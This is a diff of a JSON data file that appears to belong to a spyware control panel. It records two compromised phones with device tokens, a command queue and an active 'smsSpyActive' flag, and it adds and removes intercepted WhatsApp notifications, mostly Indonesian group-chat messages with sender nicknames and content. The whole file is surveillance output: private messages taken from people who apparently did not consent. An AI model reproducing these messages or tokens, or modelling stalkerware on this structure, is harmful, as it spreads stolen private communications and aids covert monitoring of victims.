@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048320702,
+    "lastSeen": 1775048323771,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13901 pesan): ~ Dapa",
+        "content": ".brat apedie",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048324488
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14429 pesan dari 10 chat",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048322888
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13900 pesan): ~ ୨ৎ✿sapa_imupp✿୨ৎ",
+        "content": "Tencuuuu",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048322816
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13899 pesan): ~ idk",
@@ -3995,30 +4019,6 @@
         "time": "01/04 20:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046851348
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13753 pesan): ~ p!nz",
-        "content": "@⁨~aan⁩",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046851286
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (99 pesan): ~ Dark Chocolate 🍫👅",
-        "content": "Yang bener jink",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046851267
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB OPTES EXO X XEMET (21 pesan): ~ dimv",
-        "content": "optes pm",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046851169
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048319857,
+    "lastSeen": 1775048322930,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14429 pesan dari 10 chat",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048322904
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13900 pesan): ~ ୨ৎ✿sapa_imupp✿୨ৎ",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046851309
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (99 pesan): ~ Dark Chocolate 🍫👅",
-        "content": "Yang bener jink",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046851234
       }
     ],
     "galleryPhotos": [],
